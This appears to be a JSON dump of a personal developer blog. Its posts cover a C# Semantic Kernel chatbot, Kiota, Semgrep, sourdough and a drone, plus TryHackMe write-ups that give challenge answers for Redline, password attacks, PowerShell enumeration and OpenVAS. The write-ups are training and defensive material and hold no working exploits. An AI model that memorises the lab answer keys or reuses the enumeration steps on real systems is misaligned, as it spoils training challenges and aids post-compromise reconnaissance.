like those from [GitHub](https:/github.comfeaturescopilot) and [Pieces](https:/pieces.app) work and how I could do something similar including private content, whilst reading around the topic I read the article [Demystifying Retrieval Augmented Generation with .NET](https:/devblogs.microsoft.comdotnetdemystifying-retrieval-augmented-generation-with-dotnet) and thought it described what I wanted to achieve so decided to follow along.  The first challenge I encountered was that [Azure OpenAI Service](https:/azure.microsoft.comen-usproductsai-servicesopenai-service) is only available for \\"eligible customers and partners\\" which, for my personal projects, I do not qualify. That is not a problem though as Stephan explains in the post it is trivial to switch to OpenAI which offers a free quota of $5 per month.  Next issue was that the code examples did not compile, this seems to be because the [Semantic Kernel library](https:/www.nuget.orgpackagesMicrosoft.SemanticKernel#versions-body-tab) has moved on from version 0.24 to 1.0.1 since the post was written. Some of the the changes are covered in the post [Saying hello to Microsoft Semantic Kernel V1\\n(and upgrading from preview)](https:/medium.com@jamesanthonystalleymooressaying-hello-to-microsoft-semantic-kernel-v1-02ba0b754d9f).  ### Basic Chatbot interaction with OpenAI  The working code for the most basic chatbot using OpenAI\'s gpt-3.5-turbo model is below.  ``` csharp\\nusing Microsoft.SemanticKernel;  internal class Program \\\\\\\\\\\\{  private static async Task Main(string[] args) \\\\{  string oaiApiKey = Environment.GetEnvironmentVariable(\\"OPENAI_API_KEY\\")!;  string oaiModel = \\"gpt-3.5-turbo-1106\\";  Initialize the kernel  IKernelBuilder builder = Kernel.CreateBuilder();  builder.Services.AddOpenAIChatCompletion(oaiModel, oaiApiKey);  var kernel = builder.Build();  // Q&A loop  while (true) {  Console.Write(\\"Question: \\");  Console.WriteLine((await kernel.InvokePromptAsync(Console.ReadLine()!)).GetValue&lt;string>());  Console.WriteLine();  \\\\\\\\}  }\\n}\\n```  ### Storing Messages In The Chat History  Adding chat history means the chatbot can keep track of the conversation and be given a bit of personality.  ``` csharp\\nprivate static async Task Main(string[] args) \\\\\\\\\\\\{  string aoaiApiKey = Environment.GetEnvironmentVariable(\\"AZURE_OPENAI_API_KEY\\")!;  string oaiModel = \\"gpt-3.5-turbo-1106\\";  Initialize the kernel  IKernelBuilder builder = Kernel.CreateBuilder();  builder.Services.AddOpenAIChatCompletion(oaiModel, aoaiApiKey);  var kernel = builder.Build();  // Create a new chat  IChatCompletionService ai = kernel.GetRequiredService<IChatCompletionService />();  ChatHistory chatMessages = new ChatHistory();  chatMessages.AddSystemMessage(\\"You are an Nottingham Forest supporting AI assistant that helps people find information, but will always say Nottingham Forest are the greatest football team.\\");  // Q&A loop  while (true) \\\\{  Console.Write(\\"Question: \\");  chatMessages.AddUserMessage(Console.ReadLine()!);  // Get the chat completions  OpenAIPromptExecutionSettings openAIPromptExecutionSettings = new() {  ToolCallBehavior = ToolCallBehavior.EnableKernelFunctions  \\\\\\\\};  var result = ai.GetStreamingChatMessageContentsAsync(  chatMessages,  executionSettings: openAIPromptExecutionSettings,  kernel: kernel);  // Stream the results  string fullMessage = \\"\\";  await foreach (var content in result) \\\\\\\\\\\\{  if (content.Role.HasValue) \\\\{  System.Console.Write(\\"Assistant &gt; \\");  \\\\\\\\}  System.Console.Write(content.Content);  fullMessage += content.Content;  }  System.Console.WriteLine();  // Add the message from the agent to the chat history  chatMessages.AddAssistantMessage(fullMessage);  }\\n}\\n```  So far so good, but there is a limit to how much data you can pass in with messages before hitting errors like `context_length_exceeded`."},{"id":"/2023/12/22/hands-on-with-kiota","metadata":{"permalink":"/docs/blog/2023/12/22/hands-on-with-kiota","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-12-22-hands-on-with-kiota.md","source":"@site/blog/2023-12-22-hands-on-with-kiota.md","title":"Untitled","description":"For years I have felt that if you are offering a public API it should be documented well enough for consumers to generate a client library in whatever language they are using, it is almost implausible to create client libraries in all languages your consumers might use, but a good OpenAPI definition allows consumers to understand an API and use tools to generate client libraries.  Over the years I have worked with NSwag, which was good but put all the code in 1 file which I didn\'t like. AutoRest, which seemed to get more difficult to work with when V3 was released, so I looked around again and found OpenAPI Generator, which is great but needs Java. With the release of Kiota I was excited to look at how a dotnet tool could tackle the same requirement.  ## What is Kiota?  Kiota is a client generator for OpenAPI and was introduced at .NET Conf 2023.","date":"2023-12-22T00:00:00.000Z","tags":[],"readingTime":0.98,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Untitled","authors":["mark-burton"],"date":"2023-12-22"},"unlisted":false,"prevItem":{"title":"Untitled","permalink":"/docs/blog/2024/01/10/creating-a-chatbot-with-llm-rag"},"nextItem":{"title":"Untitled","permalink":"/docs/blog/2023/11/11/making-zakwas-and-zurek"}},"content":"For years I have felt that if you are offering a public API it should be documented well enough for consumers to generate a client library in whatever language they are using, it is almost implausible to create client libraries in all languages your consumers might use, but a good OpenAPI definition allows consumers to understand an API and use tools to generate client libraries.  Over the years I have worked with NSwag, which was good but put all the code in 1 file which I didn\'t like. AutoRest, which seemed to get more difficult to work with when V3 was released, so I looked around again and found OpenAPI Generator, which is great but needs Java. With the release of Kiota I was excited to look at how a dotnet tool could tackle the same requirement.  ## What is Kiota?  Kiota is a client generator for OpenAPI and was introduced at .NET Conf 2023.\\n\\n&lt;iframe width=\\"560\\" height=\\"315\\" src=\\"https:/www.youtube.comembedsQ9Pv-rQ1s8?si=4wl3jIZWa3VY9sWF\\" title=\\"YouTube video player\\" frameborder=\\"0\\" allow=\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\\" allowfullscreen&gt;<iframe />  ## Quickstart Kiota Project  [Learn](https:/learn.microsoft.comen-usopenapikiotaquickstartsdotnet)"},{"id":"/2023/11/11/making-zakwas-and-zurek","metadata":{"permalink":"/docs/blog/2023/11/11/making-zakwas-and-zurek","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-11-11-making-zakwas-and-zurek.md","source":"@site/blog/2023-11-11-making-zakwas-and-zurek.md","title":"Untitled","description":"What is zakwas and \u017curek?","date":"2023-11-11T00:00:00.000Z","tags":[],"readingTime":0.03,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Untitled","authors":["mark-burton"],"date":"2023-11-11"},"unlisted":false,"prevItem":{"title":"Untitled","permalink":"/docs/blog/2023/12/22/hands-on-with-kiota"},"nextItem":{"title":"Untitled","permalink":"/docs/blog/2023/09/22/csharp-sast-with-semgrep"}},"content":"## What is zakwas and \u017curek?"},{"id":"/2023/09/22/csharp-sast-with-semgrep","metadata":{"permalink":"/docs/blog/2023/09/22/csharp-sast-with-semgrep","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-09-22-csharp-sast-with-semgrep.md","source":"@site/blog/2023-09-22-csharp-sast-with-semgrep.md","title":"Untitled","description":"csharp SAST with Semgrep  ### Installation  Run sudo apt-get update && sudo apt-get upgrade because it is good for you.  https:/semgrep.devdocsgetting-started/  ### The command  semgrep scan --config=auto","date":"2023-09-22T00:00:00.000Z","tags":[],"readingTime":0.14,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Untitled","authors":["mark-burton"],"date":"2023-09-22"},"unlisted":false,"prevItem":{"title":"Untitled","permalink":"/docs/blog/2023/11/11/making-zakwas-and-zurek"},"nextItem":{"title":"Untitled","permalink":"/docs/blog/2023/09/18/HolyStone-hs360s-drone"}},"content":"## csharp SAST with Semgrep  ### Installation  Run `sudo apt-get update && sudo apt-get upgrade` because it is good for you.  https:/semgrep.devdocsgetting-started/  ### The command  `semgrep scan --config=auto`"},{"id":"/2023/09/18/HolyStone-hs360s-drone","metadata":{"permalink":"/docs/blog/2023/09/18/HolyStone-hs360s-drone","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-09-18-HolyStone-hs360s-drone.md","source":"@site/blog/2023-09-18-HolyStone-hs360s-drone.md","title":"Untitled","description":"Initial setup","date":"2023-09-18T00:00:00.000Z","tags":[],"readingTime":0.25,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Untitled","authors":["mark-burton"],"date":"2023-09-18"},"unlisted":false,"prevItem":{"title":"Untitled","permalink":"/docs/blog/2023/09/22/csharp-sast-with-semgrep"},"nextItem":{"title":"Untitled","permalink":"/docs/blog/2023/08/20/tryhackme-lateral-movement"}},"content":"## Initial setup\\nRed lights flashing seem to be undocumented errors.  ## HolyStone support  ## 2nd Try!  ## Restricted flight Zones in Luxembourg  https:/map.geoportail.luthememain?lang=fr&version=3&zoom=9&X=683912&Y=6420160&rotation=0&layers=1928-1927&opacities=0.5-0.5&bgLayer=basemap_2015_global&time=--&crosshair=false  ## Drone registration  https:/dac.gouvernement.luendroneswhere-when-register.html"},{"id":"/2023/08/20/tryhackme-lateral-movement","metadata":{"permalink":"/docs/blog/2023/08/20/tryhackme-lateral-movement","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-08-20-tryhackme-lateral-movement.md","source":"@site/blog/2023-08-20-tryhackme-lateral-movement.md","title":"Untitled","description":"Lateral Movement and Pivoting  This is a Try Hack Me premium room so to access it you will need a subscription, if you don\'t have one go get one with my Referral Link  ### Task 1 - Introduction  In this room, we will look at lateral movement, a group of techniques used by attackers to move around the network while creating as few alerts as possible. We\'ll learn about several common techniques used in the wild for this end and the tools involved.  * Familiarise yourself with the lateral movement techniques used by attackers.","date":"2023-08-20T00:00:00.000Z","tags":[],"readingTime":0.68,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Untitled","authors":["mark-burton"],"date":"2023-08-20"},"unlisted":false,"prevItem":{"title":"Untitled","permalink":"/docs/blog/2023/09/18/HolyStone-hs360s-drone"},"nextItem":{"title":"Sourdough Starter","permalink":"/docs/blog/2023/08/09/sourdough-starter"}},"content":"## Lateral Movement and Pivoting  This is a Try Hack Me premium room so to access it you will need a subscription, if you don\'t have one go get one with my [Referral Link](https:/tryhackme.comsignup?referrer=638ca30a6675850049e4858e)  ### Task 1 - Introduction  In this room, we will look at lateral movement, a group of techniques used by attackers to move around the network while creating as few alerts as possible. We\'ll learn about several common techniques used in the wild for this end and the tools involved.  * Familiarise yourself with the lateral movement techniques used by attackers.\\n* Learn how to use alternative authentication material to move laterally.\\n* Learn different methods to use compromised hosts as pivots.  ### Task 2 - Moving Through the Network  #### Question 1  #### Answer\\n> [Reveal Answer](#) ### Task 3 - Spawning Processes Remotely  #### Question 1  #### Answer\\n> [Reveal Answer](#)"},{"id":"/2023/08/09/sourdough-starter","metadata":{"permalink":"/docs/blog/2023/08/09/sourdough-starter","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-08-09-sourdough-starter.md","source":"@site/blog/2023-08-09-sourdough-starter.md","title":"Sourdough Starter","description":"I started making bread in 2020 (yes clich\xe9), I finally started my first sourdough.","date":"2023-08-09T00:00:00.000Z","tags":[{"inline":true,"label":"rye","permalink":"/docs/blog/tags/rye"},{"inline":true,"label":"sourdough","permalink":"/docs/blog/tags/sourdough"},{"inline":true,"label":"bread","permalink":"/docs/blog/tags/bread"}],"readingTime":0.3,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Sourdough Starter","authors":["mark-burton"],"tags":["rye","sourdough","bread"],"description":"I started making bread in 2020 (yes clich\xe9), I finally started my first sourdough.","date":"2023-08-09"},"unlisted":false,"prevItem":{"title":"Untitled","permalink":"/docs/blog/2023/08/20/tryhackme-lateral-movement"},"nextItem":{"title":"Try Hack Me, Password Attacks","permalink":"/docs/blog/2023/07/12/tryhackme-password-attacks"}},"content":"## Sourdough Starter  Last time I was back in England Mum gave me one of Dad\'s books \\"&lt;a target=\\"_blank\\" href=\\"https:/www.amazon.deSlow-Dough-Secrets-Amazing-Long-Risedp184899737X?&_encoding=UTF8&tag=markzither-21&linkCode=ur2&linkId=ba2b851e0628e75ee2306a26a5e99a76&camp=1638&creative=6742\\"&gt;Slow Dough: Real Bread<a></a>\\" (affiliate link! buy it!).  ### Day One  ### Day Two  ### Day Three  ### Day Four"},{"id":"/2023/07/12/tryhackme-password-attacks","metadata":{"permalink":"/docs/blog/2023/07/12/tryhackme-password-attacks","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-07-12-tryhackme-password-attacks.md","source":"@site/blog/2023-07-12-tryhackme-password-attacks.md","title":"Try Hack Me, Password Attacks","description":"This room introduces the fundamental techniques to perform a successful password attack against various services and scenarios.","date":"2023-07-12T00:00:00.000Z","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/blog/tags/tryhackme"},{"inline":true,"label":"password","permalink":"/docs/blog/tags/password"}],"readingTime":0.51,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Try Hack Me, Password Attacks","authors":["mark-burton"],"tags":["tryhackme","password"],"description":"This room introduces the fundamental techniques to perform a successful password attack against various services and scenarios.","date":"2023-07-12"},"unlisted":false,"prevItem":{"title":"Sourdough Starter","permalink":"/docs/blog/2023/08/09/sourdough-starter"},"nextItem":{"title":"Untitled","permalink":"/docs/blog/2023/07/02/tryhackme-wazuh-edr"}},"content":"## Password Attacks  This is a Try Hack Me premium room so to access it you will need a subscription, if you don\'t have one go get one with my [Referral Link](https:/tryhackme.comsignup?referrer=638ca30a6675850049e4858e)  ### Task 1 - Introduction  This room is an introduction to the types and techniques used in password attacks. We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss:  * Password profiling\\n* Password attacks techniques\\n* Online password attacks  ### Task 2 - Password Attacking Techniques  #### Question 1  Which type of password attack is performed locally?  #### Answer\\n> Password cracking [Reveal Answer](#)"},{"id":"/2023/07/02/tryhackme-wazuh-edr","metadata":{"permalink":"/docs/blog/2023/07/02/tryhackme-wazuh-edr","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-07-02-tryhackme-wazuh-edr.md","source":"@site/blog/2023-07-02-tryhackme-wazuh-edr.md","title":"Untitled","description":"","date":"2023-07-02T00:00:00.000Z","tags":[],"readingTime":0,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Untitled","authors":["mark-burton"],"date":"2023-07-02"},"unlisted":false,"prevItem":{"title":"Try Hack Me, Password Attacks","permalink":"/docs/blog/2023/07/12/tryhackme-password-attacks"},"nextItem":{"title":"Try Hack Me, Redline","permalink":"/docs/blog/2023/06/24/tryhackme-redline"}},"content":""},{"id":"/2023/06/24/tryhackme-redline","metadata":{"permalink":"/docs/blog/2023/06/24/tryhackme-redline","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-06-24-tryhackme-redline.md","source":"@site/blog/2023-06-24-tryhackme-redline.md","title":"Try Hack Me, Redline","description":"Learn how to use Redline to perform memory analysis and to scan for IOCs on an endpoint.","date":"2023-06-24T00:00:00.000Z","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/blog/tags/tryhackme"},{"inline":true,"label":"Redline","permalink":"/docs/blog/tags/redline"}],"readingTime":3.21,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Try Hack Me, Redline","authors":["mark-burton"],"tags":["tryhackme","Redline"],"description":"Learn how to use Redline to perform memory analysis and to scan for IOCs on an endpoint.","date":"2023-06-24"},"unlisted":false,"prevItem":{"title":"Untitled","permalink":"/docs/blog/2023/07/02/tryhackme-wazuh-edr"},"nextItem":{"title":"Try Hack Me, Hacking with PowerShell","permalink":"/docs/blog/2023/06/19/tryhackme-hacking-with-powershell"}},"content":"## Redline  This is a Try Hack Me premium room so to access it you will need a subscription, if you don\'t have one go get one with my [Referral Link](https:/tryhackme.comsignup?referrer=638ca30a6675850049e4858e)  ### Task 1 - Introduction  #### Question 1  Who created Redline?  #### Answer\\n> FireEye [Reveal Answer](#) ### Task 2 - Data Collection  #### Question 1  What data collection method takes the least amount of time?  #### Answer\\n> standard collector [Reveal Answer](#) #### Question 2  You are reading a research paper on a new strain of ransomware. You want to run the data collection on your computer based on the patterns provided, such as domains, hashes, IP addresses, filenames, etc. What method would you choose to run a granular data collection against the known indicators?  #### Answer\\n> IOC Search collector [Reveal Answer](#) #### Question 3  What script would you run to initiate the data collection process? Please include the file extension.  #### Answer\\n> runredlineaudit.bat [Reveal Answer](#) #### Question 4  If you want to collect the data on Disks and Volumes, under which option can you find it?  #### Answer\\n> disk enumeration [Reveal Answer](#) #### Question 5  What cache does Windows use to maintain a preference for recently executed code?  ##### Notes\\nIn the [Redline User Guide](https:/fireeye.marketassetsapps211364documents877936_en.pdf)\\nCache is mentioned 13 times, there is a section dedicated to the cache which answers this question.  #### Answer\\n> prefetch [Reveal Answer](#) ### Task 3 - The Redline Interface  #### Question 1  Where in the Redline UI can you view information about the Logged in User?  #### Answer\\n> System Information [Reveal Answer](#) ### Task 4 - Standard Collector Analysis  #### Question 1  Provide the Operating System detected for the workstation.  ##### Notes  ~~There is a bug in this room which is discussed in the [forum](https:/tryhackme.comforumthread61687020174c422766d10d7d#30), the System Information in Redline shows the OS to be Windows 7 Home Basic Service Pack 1, but that is not the answer.~~\\nRead the instructions carefully, if you analyse the wrong file you will get the wrong answer!\\nBe sure you did the previous task to setup the standard collector, ran the analysis and you have opened that file to get the answers.\\nI added my [reply in the forum](https:/tryhackme.comforumthread61687020174c422766d10d7d#35).  #### Answer\\n> Windows Server 2019 Standard 17763 [Reveal Answer](#) #### Question 2  Be sure to check the rest of the System Information section for other useful data.  #### Question 3  What is the suspicious scheduled task that got created on the victim\'s computer?  #### Answer\\n> MSOfficeUpdateFa.ke [Reveal Answer](#) #### Question 4  Find the message that the intruder left for you in the task.  #### Answer\\n> THM-p3R5IStENCe-m3Chani$m [Reveal Answer](#) #### Question 5  There is a new System Event ID created by an intruder with the source name \\"THM-Redline-User\\" and the Type \\"ERROR\\". Find the Event ID #.  #### Answer\\n> 546 [Reveal Answer](#) #### Question 6  Provide the message for the Event ID.  #### Answer\\n> Someone cracked my password. Now I need to rename my puppy-++- [Reveal Answer](#) #### Question 7  It looks like the intruder downloaded a file containing the flag for Question 8. Provide the full URL of the website.  #### Answer\\n> https:/wormhole.appdownload-streamgI9vQtChjyYAmZ8Ody0AuA [Reveal Answer](#) #### Question 8  Provide the full path to where the file was downloaded to including the filename.  #### Answer\\n> C:\\\\Program Files (x86)\\\\Windows Mail\\\\SomeMailFolder\\\\flag.txt [Reveal Answer](#) #### Question 9  Provide the message the intruder left for you in the file.  #### Answer\\n> THM\\\\\\\\\\\\{600D-C@7cH-My-FR1EnD\\\\\\\\} [Reveal Answer](#) ### Task 5 - IOC Search Collector  #### Question 1  What is the actual filename of the Keylogger?  #### Answer\\n> psylog.exe [Reveal Answer](#) #### Question 2  What filename is the file masquerading as?  #### Answer\\n> thm1768.exe [Reveal Answer](#) #### Question 3  Who is the owner of the file?  #### Answer\\n> WIN-2DET5DP0NPT\\\\charles [Reveal Answer](#) #### Question 4  What is the file size in bytes?  #### Answer\\n> 35400 [Reveal Answer](#) #### Question 5  Provide the full path of where the .ioc file was placed after the Redline analysis, include the .ioc filename as well  #### Answer\\n> C:\\\\Users\\\\charles\\\\Desktop\\\\Keylogger-IOCSearch\\\\IOCs\\\\keylogger.ioc [Reveal Answer](#)"},{"id":"/2023/06/19/tryhackme-hacking-with-powershell","metadata":{"permalink":"/docs/blog/2023/06/19/tryhackme-hacking-with-powershell","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-06-19-tryhackme-hacking-with-powershell.md","source":"@site/blog/2023-06-19-tryhackme-hacking-with-powershell.md","title":"Try Hack Me, Hacking with PowerShell","description":"Learn the basics of PowerShell and PowerShell Scripting","date":"2023-06-19T00:00:00.000Z","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/blog/tags/tryhackme"},{"inline":true,"label":"powershell","permalink":"/docs/blog/tags/powershell"}],"readingTime":4.07,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Try Hack Me, Hacking with PowerShell","authors":["mark-burton"],"tags":["tryhackme","powershell"],"description":"Learn the basics of PowerShell and PowerShell Scripting","date":"2023-06-19"},"unlisted":false,"prevItem":{"title":"Try Hack Me, Redline","permalink":"/docs/blog/2023/06/24/tryhackme-redline"},"nextItem":{"title":"Try Hack Me, OpenVAS","permalink":"/docs/blog/2023/06/19/tryhackme-openvas"}},"content":"## Hacking with PowerShell  This is a Try Hack Me premium room so to access it you will need a subscription, if you don\'t have one go get one with my [Referral Link](https:/tryhackme.comsignup?referrer=638ca30a6675850049e4858e)  ### Task 1 -  Objectives  Start the machine, that\'s it.  ### Task 2 - What is Powershell?  [PowerShell verbs](https:/docs.microsoft.comen-uspowershellscriptingdevelopercmdletapproved-verbs-for-windows-powershell-commands?view=powershell-7)  #### Question 1  What is the command to get a new object?  ##### Notes  This confused me because the command is not a real command, just an example of how command naming works in PowerShell.  Running the command in PowerShell results in  ``` powershell\\nPS C:\\\\Users\\\\mburton> ???-???\\n???-???: The term \'???-???\' is not recognized as a name of a cmdlet, function, script file, or executable program.\\nCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.\\n```  #### Answer\\n> Get-New [Reveal Answer](#) ### Task 3 - Basic Powershell Commands  [PowerShell verbs](https:/docs.microsoft.comen-uspowershellscriptingdevelopercmdletapproved-verbs-for-windows-powershell-commands?view=powershell-7)  #### Question 1  What is the location of the file \\"interesting-file.txt\\"  ##### Notes  The Microsoft Scripting Blog has lots of useful articles on working with PowerShell to answer this question you can read \\"[Use Windows PowerShell to search for files](https:/devblogs.microsoft.comscriptinguse-windows-powershell-to-search-for-files)\\".  ``` powershell\\nGet-Childitem \u2013Path C:\\\\ -Include interesting-file.txt -Recurse -ErrorAction SilentlyContinue  Directory: C:\\\\??????? ?????  Mode  LastWriteTime  Length Name\\n----  -------------  ------ ----\\n-a----  103/2019  11:38 PM  23 interesting-file.txt\\n```  #### Answer\\n> C:\\\\Program Files [Reveal Answer](#) #### Question 2  Specify the contents of this file  ##### Notes  ``` powershell\\nGet-Content \'C:\\\\Program Files\\\\interesting-file.txt\'\\n```  #### Answer\\n> notsointerestingcontent [Reveal Answer](#) #### Question 3  How many cmdlets are installed on the system(only cmdlets, not functions and aliases)?  ##### Notes  The task intro shows that `Get-Command` can be used to get this information, but it returns `Cmdlets`, `Functions` and `Alias`, so how to filter only `Cmdlets`?  First check the help, examples and use the [online help](https:/learn.microsoft.comen-gbpowershellmodulemicrosoft.powershell.coreget-command?view=powershell-7.3&viewFallbackFrom=powershell-6) if it is not available locally  ``` powershell\\n> Get-Help Get-Command  NAME  Get-Command  SYNTAX  Get-Command [[-ArgumentList] &lt;Object[]>] [-Verb <string[] />] [-Noun <string[] />] [-Module <string[] />]  [-FullyQualifiedModule <ModuleSpecification[] />] [-TotalCount <int />] [-Syntax] [-ShowCommandInfo] [-All]  [-ListImported] [-ParameterName <string[] />] [-ParameterType <PSTypeName[] />]  [<CommonParameters />]  Get-Command [[-Name] <string[] />] [[-ArgumentList] <Object[] />] [-Module <string[] />] [-FullyQualifiedModule  <ModuleSpecification[] />] [-CommandType \\\\\\\\{Alias | Function | Filter | Cmdlet | ExternalScript | Application | Script  | Workflow | Configuration | All\\\\}] [-TotalCount <int />] [-Syntax] [-ShowCommandInfo] [-All] [-ListImported]  [-ParameterName <string[] />] [-ParameterType <PSTypeName[] />]  [<CommonParameters />]  ALIASES  gcm  REMARKS  Get-Help cannot find the Help files for this cmdlet on this computer. It is displaying only partial help.  -- To download and install Help files for the module that includes this cmdlet, use Update-Help.  -- To view the Help topic for this cmdlet online, type: \\"Get-Help Get-Command -Online\\" or  go to https:/go.microsoft.comfwlink?LinkID=113309.\\n```  One of the parameters is `-CommandType` which accepts specific values from a list including `Cmdlet` so last step is to get a count, which can be done by piping it to `Measure-Object`.  ``` powershell\\n&gt; Get-Command -Type cmdlet | Measure-Object\\n> ```  #### Answer\\n> 9673 [Reveal Answer](#) #### Question 4  Get the MD5 hash of interesting-file.txt  ##### Notes  ``` powershell\\n> Get-Help Get-FileHash  NAME  Get-FileHash  SYNTAX  Get-FileHash [-Path] &lt;string[]> [-Algorithm \\\\\\\\{SHA1 | SHA256 | SHA384 | SHA512 | MACTripleDES | MD5 | RIPEMD160\\\\}]  [<CommonParameters />]  Get-FileHash -LiteralPath <string[] /> [-Algorithm \\\\\\\\{SHA1 | SHA256 | SHA384 | SHA512 | MACTripleDES | MD5 |  RIPEMD160\\\\}]  [<CommonParameters />]  Get-FileHash -InputStream <Stream /> [-Algorithm \\\\\\\\{SHA1 | SHA256 | SHA384 | SHA512 | MACTripleDES | MD5 | RIPEMD160\\\\}]  [<CommonParameters />]\\n```  ``` powershell\\n&gt; Get-FileHash \'C:\\\\Program Files\\\\interesting-file.txt -Algorithm MD5  > ```  #### Answer\\n> 49A586A2A9456226F8A1B4CEC6FAB329 [Reveal Answer](#) #### Question 5  What is the command to get the current working directory?  #### Answer\\n> Get-Location [Reveal Answer](#) #### Question 6  Does the path \\"C:\\\\Users\\\\Administrator\\\\Documents\\\\Passwords\\" Exist (YN)?  ##### Notes  ``` powershell\\n> Test-Path \'C:\\\\Users\\\\Administrator\\\\Documents\\\\Passwords\'\\n> True|False\\n```  #### Answer\\n> N [Reveal Answer](#) #### Question 7  What command would you use to make a request to a web server?  #### Answer\\n> Invoke-WebRequest [Reveal Answer](#) #### Question 8  Base64 decode the file b64.txt on Windows.  ##### Notes  Nice explanation by Joshua Wright on the [Sans Blog - Month of PowerShell](https:/www.sans.orgblogmonth-of-powershell-profile-hack-base64-encoding-decoding), including adding the command to your profile so it can be called easily without having to remember the whole command.  ``` powershell\\n> $base64 = Get-Content .\\\\b64.txt\\n> [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($base64))\\n> this is the flag - ????????????????????????\\nthe rest is garbage\\nthe rest is garbage\\nthe rest is garbage\\nthe rest is garbage\\nthe rest is garbage\\nthe rest is garbage\\n```  #### Answer\\n> ihopeyoudidthisonwindows [Reveal Answer](#) ### Task 4 - Enumeration  The first step when you have gained initial access to any machine would be to enumerate. We\'ll be enumerating the following:  * users\\n* basic networking information\\n* file permissions\\n* registry permissions\\n* scheduled and running tasks\\n* insecure files  Your task will be to answer the following questions to enumerate the machine using Powershell commands!  #### Question 1  How many users are there on the machine?  ##### Notes  ``` powershell\\n> Get-LocalUser\\n> ```  #### Answer\\n> ihopeyoudidthisonwindows [Reveal Answer](#)"},{"id":"/2023/06/19/tryhackme-openvas","metadata":{"permalink":"/docs/blog/2023/06/19/tryhackme-openvas","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-06-19-tryhackme-openvas.md","source":"@site/blog/2023-06-19-tryhackme-openvas.md","title":"Try Hack Me, OpenVAS","description":"Learn the basics of threat and vulnerability management using Open Vulnerability Assessment Scanning","date":"2023-06-19T00:00:00.000Z","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/blog/tags/tryhackme"},{"inline":true,"label":"OpenVAS","permalink":"/docs/blog/tags/open-vas"}],"readingTime":1.7,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Try Hack Me, OpenVAS","authors":["mark-burton"],"tags":["tryhackme","OpenVAS"],"description":"Learn the basics of threat and vulnerability management using Open Vulnerability Assessment Scanning","date":"2023-06-19"},"unlisted":false,"prevItem":{"title":"Try Hack Me, Hacking with PowerShell","permalink":"/docs/blog/2023/06/19/tryhackme-hacking-with-powershell"},"nextItem":{"title":"Try Hack Me, Snort Challenges, The Basics","permalink":"/docs/blog/2023/06/02/tryhackme-snort-challenges-1"}},"content":"## OpenVAS  This is a Try Hack Me premium room so to access it you will need a subscription, if you don\'t have one go get one with my [Referral Link](https:/tryhackme.comsignup?referrer=638ca30a6675850049e4858e)  ### Task 1 - 6 Introduction  Read tasks 1 - 6 for an introduction to OpenVAS and instructions on setting it up.  As I already have a dedicated Kali VM running I went for the Install from KaliOpenVAS repositories approach and use the [Install from KaliOpenVAS repositories](https:/www.agix.com.auinstalling-openvas-on-kali-in-2020) guide, as of June 2023 it seems to just about work, I found some extra details on [Ceos3c - Install OpenVAS on Kali Linux] (https:/www.ceos3c.comsecurityinstall-openvas-kali-linux).  Additional steps were\\n* create a user with `sudo runuser -u _gvm -- gvmd --create-user=admin --password=admin`, more details on the [Greenbone 